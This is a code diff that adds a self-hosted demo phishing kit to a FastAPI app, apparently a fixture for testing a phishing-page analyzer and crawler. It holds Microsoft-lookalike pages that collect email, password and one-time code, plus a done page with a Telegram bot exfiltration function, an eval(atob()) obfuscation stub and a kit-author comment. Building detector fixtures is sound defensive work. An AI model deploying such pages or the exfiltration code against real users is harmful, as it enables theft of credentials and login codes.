@@ -208,3 +208,51 @@ async def tracker_check(url: str):
 @app.delete("/api/tracker")
 async def tracker_remove(url: str):
     return {"ok": await T.remove(_norm_url(url))}
+
+
+# ── built-in EXAMPLE phishing kit (safe, self-hosted) to test the walker end-to-end ─────────────
+# Detonate http://127.0.0.1:8090/demo-phish/  — a multi-step Microsoft-lookalike: login -> a "please
+# wait 60 seconds" interstitial -> an OTP step -> a done page whose source carries a Telegram exfil
+# token + obfuscation + a kit-author marker (so the code analyzer + walker light up).
+_PHISH_CSS = ("<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;margin:0}"
+              ".box{max-width:420px;margin:8vh auto;background:#fff;padding:44px;"
+              "box-shadow:0 2px 8px rgba(0,0,0,.13)}h1{font-size:23px;font-weight:600;margin:.2em 0}"
+              "input{width:100%;padding:11px;margin:9px 0;border:1px solid #ccc;box-sizing:border-box}"
+              "button{background:#0067b8;color:#fff;border:0;padding:10px 22px;float:right;cursor:pointer}"
+              ".logo{color:#0067b8;font-weight:700;font-size:17px}p{color:#444}</style>")
+_TG = "8123456789:AAG1234567890abcdefghijklmnopqrstuv"
+
+_PHISH_LOGIN = ("<!doctype html><html><head><title>Sign in to your Microsoft account</title>" + _PHISH_CSS +
+                "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Sign in</h1>"
+                "<form method='POST' action='/demo-phish/verify'>"
+                "<input type='email' name='loginfmt' placeholder='Email, phone, or Skype' required>"
+                "<input type='password' name='passwd' placeholder='Password' required>"
+                "<button type='submit'>Sign in</button></form></div></body></html>")
+_PHISH_WAIT = ("<!doctype html><html><head><title>Verifying your account…</title>" + _PHISH_CSS +
+               "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Please wait</h1>"
+               "<p>We are verifying your account. This can take up to <b>60 seconds</b>. "
+               "Do not close this window.</p><p style='color:#888'>Redirecting in "
+               "<span id='c'>60</span> seconds…</p><script>var n=60,e=document.getElementById('c');"
+               "var t=setInterval(function(){n-=6;if(n<0)n=0;e.textContent=n;"
+               "if(n<=0){clearInterval(t);location.href='/demo-phish/otp';}},1000);"
+               "</script></div></body></html>")
+_PHISH_OTP = ("<!doctype html><html><head><title>Enter security code — Microsoft</title>" + _PHISH_CSS +
+              "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Verify your identity</h1>"
+              "<p>We texted a code to your phone. Enter it to continue.</p>"
+              "<form method='POST' action='/demo-phish/done'>"
+              "<input type='text' name='otc' inputmode='numeric' placeholder='Enter code' required>"
+              "<button type='submit'>Verify</button></form></div></body></html>")
+_PHISH_DONE = ("<!doctype html><html><head><title>Account verified — Microsoft</title>" + _PHISH_CSS +
+               "</head><body><div class='box'><div class='logo'>Microsoft</div>"
+               "<h1>Thanks — you're verified</h1><p>You're all set. You can close this window.</p>"
+               "<!-- coded by m1rr0r -->"
+               "<script>var _b='" + _TG + "';var _c='987654321';"
+               "function ship(d){fetch('https://api.telegram.org/bot'+_b+'/sendMessage?chat_id='+_c"
+               "+'&text='+encodeURIComponent(d));}eval(atob('dmFyIF94PTE7'));</script>"
+               "</div></body></html>")
+_PHISH_PAGES = {"": _PHISH_LOGIN, "verify": _PHISH_WAIT, "otp": _PHISH_OTP, "done": _PHISH_DONE}
+
+
+@app.api_route("/demo-phish/{page:path}", methods=["GET", "POST"])
+async def demo_phish(page: str = ""):
+    return HTMLResponse(_PHISH_PAGES.get(page.strip("/"), _PHISH_LOGIN))
